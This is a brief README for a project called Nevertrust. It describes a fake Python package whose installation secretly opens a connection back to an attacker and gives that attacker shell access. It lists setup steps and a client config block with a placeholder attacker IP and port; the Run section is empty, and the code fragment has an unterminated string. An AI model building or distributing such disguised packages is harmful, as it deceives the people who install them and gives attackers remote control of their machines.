# Nevertrust

This project Simulates a fake library of python that when the target see the installation of the packets, there is a side channel that open a connection to attacker and give him possible Shellcode attack.
## Installation

You need to install socket and tqdm libraries
```bash
pip install socket tqdm 
```

## Preparations

first you make sure that you insert the correct IP of the attacker in the client file.
```python
SERVER_HOST = "IP_of_attacker"
SERVER_PORT = 5004
BUFFER_SIZE = 1440  # max size of messages, setting to 1440 after experimentation, MTU size
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>
```

# Run


